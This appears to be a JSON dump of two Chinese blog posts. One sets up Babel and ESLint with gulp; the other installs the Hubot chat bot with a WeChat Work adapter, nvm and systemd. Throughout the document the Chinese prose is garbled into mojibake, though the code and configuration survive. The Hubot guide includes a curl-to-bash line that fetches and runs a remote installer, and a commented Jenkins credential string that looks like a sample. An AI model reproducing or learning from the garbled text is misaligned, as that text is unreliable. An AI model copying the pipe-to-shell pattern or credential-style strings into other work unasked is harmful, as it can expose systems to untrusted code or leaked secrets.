æ³¨æ„ä¸Šé¢ï¼Œ**è¡¨ç¤ºæ´ç©¿æ‰€æœ‰å­ç›®å½•ã€‚è¿è¡Œ gulp ï¼Œå°±ä¼šåœ¨ dist ç›®å½•ä¸‹ç”Ÿæˆæ–°çš„ test.js ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n\u0026#39;use strict\u0026#39;; var sentences = [{ subject: \u0026#39;JavaScript\u0026#39;, verb: \u0026#39;is\u0026#39;, object: \u0026#39;great\u0026#39; }, { subject: \u0026#39;Elephants\u0026#39;, verb: \u0026#39;are\u0026#39;, object: \u0026#39;large\u0026#39; }]; function say(_ref) { var subject = _ref.subject, verb = _ref.verb, object = _ref.object; console.log(\u0026#34;\u0026#34;.concat(subject, \u0026#34; \u0026#34;).concat(verb, \u0026#34; \u0026#34;).concat(object)); } for (var _i = 0; _i \u0026lt; sentences.length; _i++) { var s = sentences[_i]; say(s); } ä»”ç»†çœ‹ï¼Œes6 çš„è¯­æ³• å˜æˆ es5 çš„è¯­æ³•äº†ã€‚\näºŒã€å®‰è£…eslint babel æ˜¯å¯¹è¯­æ³•è¿›è¡Œè½¬æ¢ï¼Œé‚£ä¹ˆ eslint å°±æ˜¯å¯¹è¯­æ³•ä½œå‡ºè§„èŒƒï¼Œå¾ˆå¤šäººåƒ airbnb é‚£ä¸€å¥—è§„åˆ™ã€‚\nnpm install --save-dev eslint gulp-eslint gulp-if å®‰è£…å®Œæˆåæ‰§è¡Œå‘½ä»¤è¿›è¡Œåˆå§‹åŒ–ï¼š\neslint --init ä¼šæé—®ä¸€å †é—®é¢˜ï¼š\nHow would you like to use ESLint? â€¦ â–¸ To check syntax, find problems, and enforce code style What type of modules does your project use? â€¦ â–¸ JavaScript modules (import/export) Which framework does your project use? â€¦ React Vue.js â–¸ None of these Does your project use TypeScript? â€£ No / Yes #ä¸¤ä¸ªéƒ½é€‰å“¦ Where does your code run? â€¦ (Press \u0026lt;space\u0026gt; to select, \u0026lt;a\u0026gt; to toggle all, \u0026lt;i\u0026gt; to invert selection) âœ” Browser âœ” Node How would you like to define a style for your project? â€¦ â–¸ Answer questions about your style âœ” What format do you want your config file to be in? Â· JSON âœ” What style of indentation do you use? Â· 4 âœ” What quotes do you use for strings? Â· single âœ” What line endings do you use? Â· unix âœ” Do you require semicolons? Â· Yes æœ€åå¾—åˆ°æ–‡ä»¶ .eslintrc.json\n{ \u0026#34;env\u0026#34;: { \u0026#34;browser\u0026#34;: true, \u0026#34;es2021\u0026#34;: true, \u0026#34;node\u0026#34;: true }, \u0026#34;extends\u0026#34;: \u0026#34;eslint:recommended\u0026#34;, \u0026#34;parserOptions\u0026#34;: { \u0026#34;ecmaVersion\u0026#34;: 13, \u0026#34;sourceType\u0026#34;: \u0026#34;module\u0026#34; }, \u0026#34;rules\u0026#34;: { \u0026#34;indent\u0026#34;: [ \u0026#34;error\u0026#34;, 4 ], \u0026#34;linebreak-style\u0026#34;: [ \u0026#34;error\u0026#34;, \u0026#34;unix\u0026#34; ], \u0026#34;quotes\u0026#34;: [ \u0026#34;error\u0026#34;, \u0026#34;single\u0026#34; ], \u0026#34;semi\u0026#34;: [ \u0026#34;error\u0026#34;, \u0026#34;always\u0026#34; ] } } è¿™é‡Œæ³¨æ„ï¼Œè¦æ”¹ä¸¤ä¸ªåœ°æ–¹ï¼š\n\u0026#34;es2021\u0026#34;: true, æ”¹æˆ \u0026#34;es6\u0026#34;: true, \u0026#34;ecmaVersion\u0026#34;: 13, æ”¹æˆ \u0026#34;ecmaVersion\u0026#34;: 10, ç„¶åæˆ‘ä»¬æ”¹å†™ä¸€ä¸‹ gulpfile.jsï¼Œå¢åŠ  eslint çš„éƒ¨åˆ†\nconst gulp = require(\u0026#39;gulp\u0026#39;); const babel = require(\u0026#39;gulp-babel\u0026#39;); const eslint = require(\u0026#39;gulp-eslint\u0026#39;); const gulpIf = require(\u0026#39;gulp-if\u0026#39;); function isFixed(file) { return file.eslint !== null \u0026amp;\u0026amp; file.eslint.fixed; } gulp.task(\u0026#39;default\u0026#39;, done =\u0026gt;{ gulp.src([\u0026#34;es6/**/*.js\u0026#34;, \u0026#34;public/**/*.js\u0026#34;]) .pipe(eslint({fix: true})) .pipe(eslint.format()) .pipe(gulpIf(isFixed, gulp.dest(file =\u0026gt; file.base))) .pipe(eslint.failAfterError()); gulp.src(\u0026#34;es6/**/*.js\u0026#34;) .pipe(babel()) .pipe(gulp.dest(\u0026#34;dist\u0026#34;)); gulp.src(\u0026#34;public/es6/**/*.js\u0026#34;) .pipe(babel()) .pipe(gulp.dest(\u0026#34;public/dist\u0026#34;)); done(); }); å†è¿è¡Œ gulp ï¼Œä¼šæŠŠ es6/test.js ç»™æ ¼å¼åŒ–å¥½ï¼Œå¯¹æ¯”ä¸€ä¸‹åŸæ–‡ä»¶å°±çŸ¥é“äº†ï¼Œident è¢«è°ƒæ•´æˆ4ä¸ªç©ºæ ¼äº†ï¼š\n\u0026#39;use strict\u0026#39;; const sentences = [ { subject: \u0026#39;JavaScript\u0026#39;, verb: \u0026#39;is\u0026#39;, object: \u0026#39;great\u0026#39; }, { subject: \u0026#39;Elephants\u0026#39;, verb: \u0026#39;are\u0026#39;, object: \u0026#39;large\u0026#39; }, ]; function say({ subject, verb, object }) { console.log(`${subject} ${verb} ${object}`); } for ( let s of sentences) { say(s); } ","permalink":"https://rendoumi.com/posts/20220104-javascript_babel_eslint/","summary":"\u003cp\u003eæœ€è¿‘å¼€å§‹å¼„hubotï¼Œé¡ºå¸¦ä¹Ÿå¼€å§‹å­¦ä¹  javascript ï¼Œé¦–å…ˆä»å•ç‹¬ä¸€ä¸ª nodejs é¡¹ç›®å¼€å§‹ï¼š\u003c/p\u003e\n\u003cp\u003envm å’Œ node çš„å®‰è£…ä½¿ç”¨åœ¨å‰é¢å·²ç»è¯´è¿‡äº†ï¼š  \u003ca href=\"/posts/20211217-nodejs_nvm/\"\u003eNodejså¤šç‰ˆæœ¬çš„å®‰è£…ä¸ç®¡ç†\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eæ–°å»ºä¸€ä¸ªé¡¹ç›®ç›®å½•ï¼Œbuild01\u003c/p\u003e\n\u003cp\u003eç„¶ååœ¨å…¶ä¸‹å»ºç«‹å¦‚ä¸‹ç›®å½•ç»“æ„ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir build01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e build01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir es6 dist\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir public\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e public\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir es6 dist \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20220104160358593\" loading=\"lazy\" src=\"/posts/20220104-javascript_babel_eslint/image-20220104160358593.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè§£é‡Šä¸€ä¸‹ï¼Œes6 ä¸‹æ”¾çš„æ˜¯æœåŠ¡å™¨ç«¯çš„æºä»£ç ï¼Œdist ä¸‹æ”¾çš„æ˜¯æœåŠ¡å™¨ç«¯å¤„ç†è¿‡çš„æºä»£ç ã€‚\u003c/p\u003e\n\u003cp\u003epublic/es6 æ”¾çš„æ˜¯æµè§ˆå™¨ç«¯çš„æºä»£ç ï¼Œpublic/dist æ”¾çš„æ˜¯æµè§ˆå™¨ç«¯å¤„ç†è¿‡çš„æºä»£ç ã€‚\u003c/p\u003e\n\u003ch2 id=\"ä¸€å®‰è£…gulpå’Œbabel\"\u003eä¸€ã€å®‰è£…gulpå’Œbabel\u003c/h2\u003e\n\u003cp\u003ebabel æ˜¯ç”¨æ¥åš js æ ¼å¼è½¬æ¢çš„ï¼Œæ³¨æ„ï¼ŒåŸæœ‰çš„ babel-preset-es2015 å·²ç»ä¸é€‚ç”¨äº†ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpm install --save-dev gulp gulp-babel babel-preset-env@next\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç”Ÿæˆä¸€ä¸ª\u003ccode\u003e.babelrc\u003c/code\u003e æ–‡ä»¶ï¼Œå†…å®¹å°±ä¸€è¡Œ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e{ \u0026#34;presets\u0026#34;: [\u0026#34;env\u0026#34;] }\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåœ¨ es6 ç›®å½•ä¸‹ï¼Œå»ºç«‹ä¸€ä¸ªæµ‹è¯•çš„ \u003ccode\u003etest.js\u003c/code\u003e æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e\u0026#39;use strict\u0026#39;;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003econst sentences\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e[\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  { subject: \u0026#39;JavaScript\u0026#39;, verb: \u0026#39;is\u0026#39;,  object: \u0026#39;great\u0026#39; },\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  { subject: \u0026#39;Elephants\u0026#39;,  verb: \u0026#39;are\u0026#39;, object: \u0026#39;large\u0026#39; },\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efunction say({ subject, verb, object }) {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003econsole.log(`${subject} ${verb} ${object}`);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efor ( let s of sentences) {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003esay(s);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä»”ç»†çœ‹ï¼Œä¸Šé¢è¿™ä¸ªæ–‡ä»¶ç”¨åˆ°äº† es6 çš„è¯­æ³•ï¼Œå¯¹è±¡çš„è§£æ„ï¼Œofè¯­æ³•ã€‚\u003c/p\u003e","title":"Javascriptçš„é¡¹ç›®ä¸babelå’Œeslint"},{"content":"Hubotæ˜¯ä¸€ä¸ªé€šç”¨çš„èŠå¤©æœºå™¨äººï¼Œèƒ½å’Œå¾ˆå¤šèŠå¤©è½¯ä»¶é›†æˆï¼Œæ¯”å¦‚slackã€rockchatã€telegramã€ä¼ä¸šå¾®ä¿¡ã€IRCç­‰ã€‚\nå…¬å¸ç”¨çš„æ˜¯ä¼ä¸šå¾®ä¿¡ï¼Œä¹‹å‰ç”¨ç¾¤æœºå™¨äººå’Œ prometheus é›†æˆï¼Œå‘é€å„ç§å‘Šè­¦ä¿¡æ¯ï¼Œä½†æ˜¯ç¾¤æœºå™¨äººæ— æ³•æ¥æ”¶æ¶ˆæ¯ï¼›åŒæ—¶æˆ‘ä»¬æƒ³é›†æˆè¿›å»å¾ˆå¤šè‡ªå®šä¹‰å‘½ä»¤ï¼Œæ¯”å¦‚å‘é€æŒ‡ä»¤å°±å¼€å§‹ jenkins buildï¼Œå‘é€ ansible æŒ‡ä»¤æ‰§è¡Œï¼Œå‘é€æµé‡å›¾å°±è‡ªåŠ¨æŠŠæœºæˆ¿çš„æµé‡å›¾å‘è¿‡æ¥ï¼Œè¿™ä¸ªç¾¤æœºå™¨äººå°±ç”¨ä¸æˆäº†ã€‚æ‰€ä»¥å¿…é¡»å†ç›´æ¥ä¸€äº›ï¼Œæ„å»ºä¸€ä¸ªä¼ä¸šå¾®ä¿¡çš„åº”ç”¨ã€‚\nä¸€ã€ä¼ä¸šå¾®ä¿¡å®‰è£…å‰å‡†å¤‡ å®‰è£…å‰éœ€è¦åœ¨ä¼ä¸šå¾®ä¿¡ä¸­æ‹¿åˆ°4ä¸ªä¿¡æ¯ï¼š\nWECHATWORK_CORP_ID WECHATWORK_APP_AGENT_ID WECHATWORK_APP_SECRET WECHATWORK_AES_KEY é¦–å…ˆè”ç³»ä¼ä¸šå¾®ä¿¡ç®¡ç†å‘˜æ–°å¢ä¸€ä¸ªåº”ç”¨ï¼š\nåœ¨â€œç®¡ç†åå°-æˆ‘çš„ä¼ä¸šâ€ä¸­å¯ä»¥è·å¾—åœ°ä¸€ä¸ªä¿¡æ¯ï¼Œä¼ä¸š ID ä¿¡æ¯ï¼ŒCORP_ID ï¼š\næ‹¿æ‹¿ åœ¨â€œç®¡ç†åå°-åº”ç”¨ç®¡ç†-ç‚¹å‡»æŸå…·ä½“åº”ç”¨-è¯¦æƒ…â€é¡µä¸­å¯ä»¥è·å¾—äºŒã€ä¸‰ä¸ªä¿¡æ¯ï¼Œ APP_AGENT_ID å’Œ APP_SECRET\nç¬¬å››ä¸ª AES_KEY å°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œæˆ‘ä»¬è¿›å…¥è¿™ä¸ªåº”ç”¨ï¼Œç‚¹å‡»é…ç½®çš„å›¾æ ‡ï¼š\nç„¶åè¿›å…¥ï¼Œç‚¹å‡»å¯ç”¨ API æ¥æ”¶\nç„¶åè®¾ç½®ä¸€ä¸‹\nurl å¡«å†™ https://hubot.rendoumi.com/wechatwork/webhook Token ç‚¹éšæœºè·å– EncodingAESKey ç‚¹éšæœºè·å–ï¼Œè¿™å°±æ˜¯å…·ä½“çš„ AESKey äº† ç„¶åç‚¹å‡»ä¿å­˜ï¼Œè¿™é‡Œå¿…ç„¶ä¼šå¤±è´¥ï¼æ²¡æœ‰å…³ç³»ï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰è£…hubotå‘¢ã€‚æˆ‘ä»¬æŠŠè¿™ä¸‰ä¸ªåœ°æ–¹å…ˆè®°å½•ä¸‹æ¥ï¼Œéšåå†æ¥ç‚¹å‡»ä¿å­˜ã€‚\näºŒã€Hubot å®‰è£…å‰å‡†å¤‡ 1ã€æ³¨æ„ä¸Šé¢åœ°å€ï¼šURL åœ°å€æ˜¯ https ï¼Œç„¶å hubot çš„ç¼ºçœåœ°å€æ˜¯ http://xxx:8080 ï¼Œè¿™æ ·å¦‚æœå‰é¢æ²¡æœ‰è¯ä¹¦å¸è½½çš„è®¾å¤‡ï¼Œå°±å¾—æ­å»ºä¸€ä¸ªNginxï¼ˆhaproxyã€traefikï¼‰æ¥ä»£ç† https 443ç«¯å£åˆ°8080ã€‚\n2ã€Hubot æ˜¯æ”¯æŒ Coffeescript å’Œ nodejs çš„ï¼Œä»å®ƒçš„ Adapters ç½‘é¡µçœ‹\nhttps://hubot.github.com/docs/adapters/development/\né‡Œé¢éƒ½æ˜¯ coffee å‘³çš„å•ç®­å¤´å‡½æ•°ï¼Œå¯¼è‡´ä¸å¤ªç†Ÿæ‚‰çš„å…«æˆ’ä»¥ä¸ºåœ¨ wechatwork moduleå¯¼å‡ºçš„æ—¶å€™ä¹Ÿåº”è¯¥ç”¨å•ç®­å¤´å‡½æ•°ï¼Œç»“æœå°±æ‚²å‰§äº†ã€‚\næ‰€ä»¥åŠ¡å¿…æ¸…æ¥šï¼ŒAdapter çš„è¯­æ³•æ˜¯ jsï¼Œæ™®é€šè‡ªå»ºè‡ªåŠ¨å›å¤scriptå¯ä»¥ç”¨coffeescriptï¼Œåé¢ä¼šè¯¦ç»†è¯´è¿™ä¸€ç‚¹ã€‚\n3ã€å®‰è£…Hubotå¿…é¡»æ–°å»ºä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œä¸èƒ½ç”¨ root è£…\nç”¨ root ä¼šå¯¼è‡´ nodejs ä¸€å †æŠ¥é”™ï¼Œå…«æˆ’æ–°å»ºäº†ä¸€ä¸ªç”¨æˆ· botï¼Œå®¶ç›®å½•/home/botï¼Œç„¶åå†åœ¨è¿™ä¸‹é¢å»ºç«‹/home/bot/myhubotï¼Œåœ¨è¿™ä¸ªç›®å½•ä¸‹å®‰è£…ã€‚\nç†ç”±æ˜¯è¿™ä¸ªå¦‚æœç›´æ¥è£…åœ¨è¿™ä¸ªç”¨æˆ·çš„ home ç›®å½•ä¸‹ï¼Œä¼šå¯¼è‡´è¿™ä¸ªç”¨æˆ·åªèƒ½æœ‰è¿™ä¸€ä¸ªç”¨é€”äº†ï¼Œç›®å½•ç»“æ„å¤ªæµ…ï¼Œä¸€å †æ–‡ä»¶\n4ã€Hubotçš„å˜é‡å¼•å…¥éƒ½æ˜¯é€šè¿‡ç¯å¢ƒå˜é‡å¼•å…¥çš„\næ‰€ä»¥æ— è®ºä»€ä¹ˆwechatworkè¿˜æ˜¯jenkinsï¼Œéƒ½éœ€è¦é€šè¿‡ç¯å¢ƒå˜é‡å¯¼å…¥å˜é‡\nä¸‰ã€å®‰è£…Hubot é¦–å…ˆå®‰è£…nvmï¼Œå‚çœ‹æ–‡ç«  Nodejså¤šç‰ˆæœ¬çš„å®‰è£…ä¸ç®¡ç†\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash å®‰è£…çš„æ—¶å€™æœ€å¥½åŠ ä¸ª https_proxy ä»£ç†ï¼Œå› ä¸ºè¿™ä¸ª shell è„šæœ¬ä¸ç¿»å¢™å¾ˆéš¾ä¸‹ä¸‹æ¥ã€‚\nç„¶ååŠ¡å¿…å…³äº†ä»£ç†ï¼Œé€€å‡ºç»ˆç«¯å¹¶é‡æ–°è¿›å…¥ï¼Œå®‰è£… nodejs çš„æœ€æ–°ç‰ˆæœ¬\nnvm ls-remote nvm install v16.13.1 nvm list ç¡®è®¤ä¸€ä¸‹ï¼Œnodejs çš„ç‰ˆæœ¬ç¼ºçœæ˜¯ v16.13.1\nè¿™é‡Œåƒä¸‡ä¸è¦æ‰‹æ¬ æŠŠ npm çš„æºæ¢æˆå›½å†…çš„è…¾è®¯ç­‰ï¼Œå°±æ˜¯å›½å¤–æº\nç„¶åå®‰è£…hubotï¼Œå¹¶åˆå§‹åŒ–\nsu - bot npm install -g yo generator-hubot mkdir /home/bot/myhubot cd /home/bot/myhubot yo hubot ä¼šé—®å‡ ä¸ªé—®é¢˜ï¼š\nOwerï¼šå†™è‡ªå·±é‚®ç®±å°±è¡Œ Bot name: bot Description: rendoumi corp Bot adapter: campfire æ³¨æ„æœ€åä¸€ä¸ªï¼Œé€‰campfireå°±å¥½ï¼Œæˆ‘ä»¬ç¨åå†è£…wechatwork\n_____________________________ / \\ //\\ | Extracting input for | ////\\ _____ | self-replication process | //////\\ /_____\\ \\ / ======= |[^_/\\_]| /---------------------------- | | _|___@@__|__ +===+/ /// \\_\\ | |_\\ /// HUBOT/\\\\ |___/\\// / \\\\ \\ / +---+ \\____/ | | | //| +===+ \\// |xx| ? Owner zhangranrui@rendoumi.com ? Bot name bot ? Description rendoumi corp ? Bot adapter campfire ç„¶åå°±ä¼šæ˜¯æ¼«é•¿çš„ç­‰å¾…ï¼š\næœ€åä¼šæŠ¥å‡ ä¸ªè­¦å‘Šï¼Œä¸ç”¨ç®¡ï¼Œå¿½ç•¥å³å¯ã€‚\nnpm notice created a lockfile as package-lock.json. You should commit this file. + hubot-help@1.0.1 + hubot-google-images@0.2.7 + hubot-rules@1.0.0 + hubot-shipit@0.2.1 + hubot-redis-brain@1.0.0 + hubot-google-translate@0.2.1 + hubot-diagnostics@1.0.0 + hubot-scripts@2.17.2 + hubot@3.3.2 + hubot-maps@0.0.3 + hubot-heroku-keepalive@1.0.3 + hubot-pugme@0.1.1 added 99 packages from 53 contributors and audited 99 packages in 20.176s 2 packages are looking for funding run `npm fund` for details found 1 low severity vulnerability run `npm audit fix` to fix them, or `npm audit` for details æˆ‘ä»¬å…ˆè·‘ä¸€ä¸‹ï¼Œç®€å•æµ‹ä¸€ä¸‹åŠŸèƒ½ï¼Œæˆ‘ä»¬çš„bot nameè¾“å…¥çš„æ˜¯bot\ncd /home/bot/myhubot ./bin/hubot #è¿›å…¥å bot ping #å¾—åˆ°å›åº” PONG è¿™æ ·å°±è£…å¥½äº† hubotï¼Œæˆ‘ä»¬åšä¸€ä¸‹ä¿®æ”¹ï¼Œå»æ‰ heroku å’Œ redisï¼Œå¦åˆ™ä¼šä¸åœä¸¢å‡ºæŠ¥é”™ä¿¡æ¯ï¼Œä½†æ˜¯ä¸è¦ç”¨ npm å»åˆ é™¤è¿™ä¸¤ä¸ªåŒ…ï¼Œæ”¾ç€é‚£é‡Œå¤‡ç”¨ä¹Ÿä¸å å¤šå°‘ç©ºé—´çš„\ncd /home/bot/myhubot vi external-scripts.json [ \u0026#34;hubot-diagnostics\u0026#34;, \u0026#34;hubot-help\u0026#34;, \u0026#34;hubot-heroku-keepalive\u0026#34;, \u0026#34;hubot-google-images\u0026#34;, \u0026#34;hubot-google-translate\u0026#34;, \u0026#34;hubot-pugme\u0026#34;, \u0026#34;hubot-maps\u0026#34;, \u0026#34;hubot-redis-brain\u0026#34;, \u0026#34;hubot-rules\u0026#34;, \u0026#34;hubot-shipit\u0026#34; ] #å»æ‰ä¸‹é¢ä¸¤è¡Œ hubot-heroku-keepalive hubot-redis-brain ä¸‰ã€å®‰è£…å¾®ä¿¡ Adapter Adapter æ’ä»¶ï¼Œhubotæ˜¯ä¸€å¥—ç³»ç»Ÿï¼Œé€šè¿‡å„ç§æ’ä»¶è·Ÿå„ç§èŠå¤©è½¯ä»¶è¿›è¡Œäº¤äº’\nå¾®ä¿¡æ’ä»¶åŸå§‹åœ°å€ï¼šhttps://github.com/billtt/hubot-wechatwork\nå…«æˆ’ç¨å¾®æ”¹äº†ä¸€ä¸‹ï¼šhttps://github.com/zhangrr/hubot-wechatwork\nä¸»è¦æ˜¯æ·»åŠ äº†ä¸ªè‡ªåŠ¨å›åº”å’Œæ·»åŠ äº†ä¸€äº›è°ƒè¯•ä¿¡æ¯ï¼Œå¦åˆ™ä¸çŸ¥é“åŠ è½½æˆä¸æˆåŠŸã€‚\n#å…ˆè£…é‚£ä¸ªè€çš„ cd /home/bot/myhubot npm install hubot-wechatwork #è¦†ç›–æ‰è€çš„æ¨¡å— cd /home/bot/myhubot/node_modules git clone https://github.com/zhangrr/hubot-wechatwork å¯åŠ¨ä¹‹å‰æ™®åŠä¸€ä¸‹ hubot åŸºæœ¬çŸ¥è¯†ï¼Œhubot ä¸­å˜é‡çš„ä¼ å…¥éƒ½æ˜¯é€šè¿‡ç¯å¢ƒå˜é‡å¯¼å…¥çš„ï¼Œå¯åŠ¨æµ‹è¯•ä¸€ä¸‹wechatwork\nexport WECHATWORK_CORP_ID=aaaa export WECHATWORK_APP_AGENT_ID=bbbb export WECHATWORK_APP_SECRET=cccc export WECHATWORK_AES_KEY=dddd cd /home/bot/myhubot ./bin/hubot -a wechatwork çœ‹åˆ°ä¿¡æ¯ï¼ŒINFO Yunwei: loading wechatwork Adapterï¼Œè¯´æ˜å¯åŠ¨æ²¡å•¥æ¯›ç—…\nç„¶åæˆ‘ä»¬å›åˆ°ä¼ä¸šå¾®ä¿¡è¿™ä¸ªåº”ç”¨çš„åº”ç”¨ç®¡ç†ï¼Œç‚¹å‡»ä¿å­˜æ¥æ”¶æ¶ˆæ¯æœåŠ¡å™¨é…ç½®ï¼Œè¿™æ¬¡å°±åº”è¯¥èƒ½æˆåŠŸäº†ã€‚\næµ‹è¯•ä¸€ä¸‹ï¼Œæˆ‘ä»¬åœ¨ä¼ä¸šå¾®ä¿¡ä¸­ï¼Œå¯¹è¿™ä¸ªåº”ç”¨æœºå™¨äººç§èŠï¼Œå‘ä¸ª hiï¼š\nå†å‘ä¸ªhelpï¼Œä¼šå†’å‡ºä¸€å †ä¿¡æ¯\nç„¶åæˆ‘ä»¬å¯ä»¥è¯•è¯•æŒ‡ä»¤ï¼Œå†å‘ä¸ªpingï¼Œæœºå™¨äººå›PONGï¼Œè¿™å°±ç®—æ­£å¸¸å·¥ä½œäº†\nåŒæ—¶æˆ‘ä»¬åœ¨ç»ˆç«¯ä¹Ÿå¯ä»¥çœ‹åˆ°æ¥æ”¶åˆ°çš„æ¶ˆæ¯\nè¦æ³¨æ„çš„å‘½ä»¤ï¼š wechatwork æœ‰ä¸€æ¡å‘½ä»¤ chat create CHATID USER1,USER2,USER3,\u0026hellip;\nè§£é‡Šä¸€ä¸‹ï¼Œæ˜¯ç”¨æ¥å»ºç«‹ä¸€ä¸ªä¼ä¸šå¾®ä¿¡ç¾¤èŠçš„ï¼Œç¾¤ä¸»é»˜è®¤æ˜¯ç¬¬ä¸€ä¸ªäººï¼š\nchatid æ˜¯æŒ‡ä¸€ä¸ªç¾¤èŠçš„ id å·ï¼Œæ ¼å¼æ˜¯å­—æ¯+æ•°å­—ï¼Œæ¯”å¦‚yunwei001ï¼Œè¿™ä¸ªä¸€æ—¦åˆ›å»ºå°±æ— æ³•é”€æ¯ï¼Œä¼šæ°¸è¿œä¿å­˜åœ¨ä¼ä¸šå¾®ä¿¡é‚£é‡Œï¼Œåˆ‡åˆ‡è®°ä½ï¼ï¼ï¼\nuser1,user2 è¿™ç§æ˜¯å‘˜å·¥ä¼ä¸šå¾®ä¿¡çš„idï¼Œé€šå¸¸æ˜¯ç”¨æˆ·åå…¨ç§°ï¼Œæ¯”å¦‚ zhangrenren,liudaqiang\næ‰€ä»¥è¯´çš„æ—¶å€™åŠ¡å¿…è¦å°å¿ƒï¼Œä¸‡ä¸‡è®°ä½ chatid ä¸€æ—¦å»ºç«‹å°±æ— æ³•æ”¶å›ã€‚\nä¹‹åå¯ä»¥è°ƒç”¨ sendChatMessage æ¥ç»™ç¾¤èŠå‘é€æ¶ˆæ¯ã€‚\nå››ã€å‡†å¤‡systemdå¯åŠ¨hubot è¿™æ ·ä¸èƒ½æ¯æ¬¡ç”¨ä¸ªç»ˆç«¯å¯åŠ¨ hubot å§ï¼Œå†™ä¸ª systemd æ–‡ä»¶æ¥å¤„ç†å§\nç”±äºæˆ‘ä»¬ç”¨åˆ°äº†nvmï¼Œè¿™é‡Œç¡®å®éœ€è¦ä¸€äº›æŠ€å·§ï¼Œcat /etc/systemd/system/hubot.service\n[Unit] Description=Hubot Requires=network.target After=network.target [Service] Type=simple WorkingDirectory=/home/bot/myhubot User=bot Restart=always TimeoutStartSec=10 RestartSec=10 ; Configure Hubot environment variables, use quotes around vars with whitespace as shown below. ; Environment=\u0026#34;HUBOT_SLACK_TOKEN=SLACK_TOKEN\u0026#34; ; Environment=\u0026#34;HUBOT_JENKINS_AUTH=pe:x837491lkaflajksdf7\u0026#34; ; Environment=\u0026#34;HUBOT_JENKINS_URL=http://192.168.1.90:8080/\u0026#34; 